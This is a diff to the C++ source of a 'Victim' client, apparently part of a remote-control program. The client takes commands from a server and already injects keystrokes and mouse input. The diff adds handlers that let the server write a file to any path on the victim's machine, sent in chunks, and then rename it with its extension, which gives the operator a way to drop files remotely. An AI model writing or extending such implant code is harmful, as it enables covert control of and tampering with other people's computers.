@@ -1,6 +1,8 @@
 #include "victim.hpp"
 #include <thread>
 #include <iostream>
+#include <fstream>
+#include <stdio.h>
 #include <SFML/Window.hpp>
 #include <Windows.h>
 #include "../commands.hpp"
@@ -169,6 +171,68 @@ int Victim::runProcess()
 
 			SendInput(1, &input, sizeof(INPUT));
 		}
+		
+		else if (cmd == uint8_t(Cmd::SSH_START_SENDING_FILE)) {
+			uint32_t n;
+			std::string path;
+			p >> n >> path;
+
+			if (path.find_last_of('.') != std::string::npos) {
+				destFilePath = path.substr(0, path.find_last_of('.'));
+				destFileExt = path.substr(path.find_last_of('.'));
+			}
+			else {
+				destFilePath = path;
+				destFileExt = "";
+			}
+
+			sf::Packet res;
+			res << uint16_t(reqId) << uint8_t(Cmd::SSH_START_SENDING_FILE);
+			std::ofstream file(destFilePath);
+			if (file.good()) {
+				filePacketsMissing = n;
+				res << true;
+			}
+			else {
+				destFileExt = "";
+				destFilePath = "";
+				filePacketsMissing = 0;
+				res << false;
+			}
+
+			auto _ = server.send(res);
+		}
+		else if (cmd == uint8_t(Cmd::SSH_SEND_FILE_DATA)) {
+			if (destFilePath == "")
+				continue;
+
+			const void* buffer = p.getData();
+			auto data = static_cast<const char*>(buffer);
+			data += 3;
+			size_t size = p.getDataSize() - 3;
+
+			std::ofstream file(destFilePath, std::ios::app | std::ios::binary);
+			if (file.write(data, size)) {
+				sf::Packet p; 
+				p << reqId << uint8_t(Cmd::SSH_SEND_FILE_DATA);
+				auto _ = server.send(p);
+				
+				filePacketsMissing--;
+				
+				if (filePacketsMissing == 0) {
+					file.close();
+					std::cout << std::rename(destFilePath.c_str(), (destFilePath + destFileExt).c_str());
+					destFileExt = "";
+					destFilePath = "";
+				}
+			}
+			else {
+				destFileExt = "";
+				destFilePath = "";
+				filePacketsMissing = 0;
+			}
+		}
+
 		//unknown command
 		else
 			std::cerr << "unknown command received: " << int(cmd) << "\n";
